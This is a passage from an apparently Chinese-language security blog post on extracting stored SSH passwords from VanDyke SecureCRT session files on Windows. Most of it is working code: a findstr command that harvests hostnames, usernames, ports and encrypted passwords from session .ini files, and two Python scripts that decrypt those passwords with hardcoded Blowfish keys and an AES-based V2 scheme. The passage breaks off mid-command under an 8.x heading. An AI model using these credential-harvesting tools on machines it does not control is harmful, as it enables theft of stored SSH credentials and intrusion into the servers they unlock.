class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt SSHv2 passwords stored in VanDyke SecureCRT session files</span></span><br><span class="line"><span class="comment"># Can be found on Windows in:</span></span><br><span class="line"><span class="comment">#   %APPDATA%\VanDyke\Config\Sessions\sessionname.ini</span></span><br><span class="line"><span class="comment"># Tested with version 7.2.6 (build 606) for Windows</span></span><br><span class="line"><span class="comment"># Eloi Vanderbeken - Synacktiv</span></span><br><span class="line"><span class="comment">#  Decrypt SSHv2 passwords stored in VanDyke SecureCRT</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py -h</span></span><br><span class="line"><span class="comment"># usage: SecureCRT-decryptpass.py [-h] files [files ...]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#positional arguments:</span></span><br><span class="line"><span class="comment">#  files       session file(s)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#optional arguments:</span></span><br><span class="line"><span class="comment">#  -h, --help  show this help message and exit</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># ssh -p 22 user@192.168.0.1 # 123456</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">password</span>) :</span><br><span class="line">    c1 = Blowfish.new(<span class="string">&#x27;5F B0 45 A2 94 17 D9 16 C6 C6 A2 FF 06 41 82 B7&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    c2 = Blowfish.new(<span class="string">&#x27;24 A6 3D DE 5B D3 B3 82 9C 7E 06 F4 08 16 AA 07&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    padded = c1.decrypt(c2.decrypt(password.decode(<span class="string">&#x27;hex&#x27;</span>))[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> padded[:<span class="number">2</span>] != <span class="string">&#x27;\x00\x00&#x27;</span> :</span><br><span class="line">        p += padded[:<span class="number">2</span>]</span><br><span class="line">        padded = padded[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> p.decode(<span class="string">&#x27;UTF-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">REGEX_HOSTNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Hostname&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line">REGEX_PASWORD = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Password&quot;=u([0-9a-f]+)&#x27;</span>)</span><br><span class="line">REGEX_PORT = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;D:&quot;\[SSH2\] Port&quot;=([0-9a-f]&#123;8&#125;)&#x27;</span>)</span><br><span class="line">REGEX_USERNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Username&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hostname</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_HOSTNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_PASWORD.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> decrypt(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">port</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_PORT.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-p %d &#x27;</span>%(<span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">username</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_USERNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>) + <span class="string">&#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;files&#x27;</span>, <span class="built_in">type</span>=argparse.FileType(<span class="string">&#x27;r&#x27;</span>), nargs=<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="built_in">help</span>=<span class="string">&#x27;session file(s)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> args.files :</span><br><span class="line">    c = f.read().replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> f.name</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ssh %s%s%s # %s&quot;</span>%(port(c), username(c), hostname(c), password(c))</span><br></pre></td></tr></table></figure><h4 id="7-X版本"><a href="#7-X版本" class="headerlink" title="7.X版本"></a>7.X版本</h4><p>进入目录提取文件中的连接IP、端口、账号、hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /si /c:&quot;Hostname&quot; /c:&quot;\&quot;Username\&quot;=&quot; /c:&quot;\&quot;Password\&quot;=&quot; /c:&quot;\&quot;[SSH2] Port\&quot;=&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/21.png" alt="image-20210611152808283"></p><p>然后使用脚本进行解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#注意去除hash的第一位 &quot;u&quot;</span><br><span class="line">python3  SecureCRT.py dec hash</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/22.png" alt="image-20210611153105145"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, Blowfish</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureCRTCrypto</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCrypto object.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.IV = <span class="string">b&#x27;\x00&#x27;</span> * Blowfish.block_size</span><br><span class="line">        self.Key1 = <span class="string">b&#x27;\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07&#x27;</span></span><br><span class="line">        self.Key2 = <span class="string">b&#x27;\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        plain_bytes += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">        padded_plain_bytes = plain_bytes + os.urandom(Blowfish.block_size - <span class="built_in">len</span>(plain_bytes) % Blowfish.block_size)</span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(self.Key1, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        cipher2 = Blowfish.new(self.Key2, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher1.encrypt(os.urandom(<span class="number">4</span>) + cipher2.encrypt(padded_plain_bytes) + os.urandom(<span class="number">4</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(self.Key1, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        cipher2 = Blowfish.new(self.Key2, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        ciphered_bytes = <span class="built_in">bytes</span>.fromhex(Ciphertext)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciphered_bytes) &lt;= <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        padded_plain_bytes = cipher2.decrypt(cipher1.decrypt(ciphered_bytes)[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">        </span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_plain_bytes), <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> padded_plain_bytes[i] == <span class="number">0</span> <span class="keyword">and</span> padded_plain_bytes[i + <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">0</span>:i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">raise</span>(ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureCRTCryptoV2</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ConfigPassphrase : <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCryptoV2 object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            ConfigPassphrase: The config passphrase that SecureCRT uses. Leave it empty if config passphrase is not set.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.IV = <span class="string">b&#x27;\x00&#x27;</span> * AES.block_size</span><br><span class="line">        self.Key = SHA256.new(ConfigPassphrase.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) &gt; <span class="number">0xffffffff</span>:</span><br><span class="line">            <span class="keyword">raise</span> OverflowError(<span class="string">&#x27;Plaintext is too long.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        plain_bytes = \</span><br><span class="line">            <span class="built_in">len</span>(plain_bytes).to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            SHA256.new(plain_bytes).digest()</span><br><span class="line">        padded_plain_bytes = \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            os.urandom(AES.block_size - <span class="built_in">len</span>(plain_bytes) % AES.block_size)</span><br><span class="line">        cipher = AES.new(self.Key, AES.MODE_CBC, iv = self.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher.encrypt(padded_plain_bytes).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        cipher = AES.new(self.Key, AES.MODE_CBC, iv = self.IV)</span><br><span class="line">        padded_plain_bytes = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(Ciphertext))</span><br><span class="line">        </span><br><span class="line">        plain_bytes_length = <span class="built_in">int</span>.from_bytes(padded_plain_bytes[<span class="number">0</span>:<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">4</span>:<span class="number">4</span> + plain_bytes_length]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) != plain_bytes_length:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        plain_bytes_digest = padded_plain_bytes[<span class="number">4</span> + plain_bytes_length:<span class="number">4</span> + plain_bytes_length + SHA256.digest_size]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes_digest) != SHA256.digest_size:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> SHA256.new(plain_bytes).digest() != plain_bytes_digest:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Help</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    SecureCRTCipher.py &lt;enc|dec&gt; [-v2] [-p ConfigPassphrase] &lt;plaintext|ciphertext&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    &lt;enc|dec&gt;              &quot;enc&quot; for encryption, &quot;dec&quot; for decryption.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    [-v2]                  Encrypt/Decrypt with &quot;Password V2&quot; algorithm.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    [-p ConfigPassphrase]  The config passphrase that SecureCRT uses.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    &lt;plaintext|ciphertext&gt; Plaintext string or ciphertext string.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           NOTICE: Ciphertext string must be a hex string.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">EncryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCryptoV2(ConfigPassphrase).Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCrypto().Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error: Failed to encrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">DecryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCryptoV2(ConfigPassphrase).Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCrypto().Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error: Failed to decrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Main</span>(<span class="params">argc : <span class="built_in">int</span>, argv : <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">3</span> &lt;= argc <span class="keyword">and</span> argc &lt;= <span class="number">6</span>:</span><br><span class="line">            bUseV2 = <span class="literal">False</span></span><br><span class="line">            ConfigPassphrase = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;enc&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Help()</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            i = <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; argc - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> argv[i].lower() == <span class="string">&#x27;-v2&#x27;</span>:</span><br><span class="line">                    bUseV2 = <span class="literal">True</span></span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> argv[i].lower() == <span class="string">&#x27;-p&#x27;</span> <span class="keyword">and</span> i + <span class="number">1</span> &lt; argc - <span class="number">1</span>:</span><br><span class="line">                    ConfigPassphrase = argv[i + <span class="number">1</span>]</span><br><span class="line">                    i += <span class="number">2</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    Help()</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bUseV2 == <span class="literal">False</span> <span class="keyword">and</span> <span class="built_in">len</span>(ConfigPassphrase) != <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Error: ConfigPassphrase is not supported if &quot;-v2&quot; is not specified&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bEncrypt:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> EncryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> DecryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Help()</span><br><span class="line"></span><br><span class="line">    exit(Main(<span class="built_in">len</span>(sys.argv), sys.argv))</span><br></pre></td></tr></table></figure><h4 id="8-X版本"><a href="#8-X版本" class="headerlink" title="8.X版本"></a>8.X版本</h4><p>进入目录提取文件中的连接IP、端口、账号、hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /si /c:&quot;Hostname&quot; 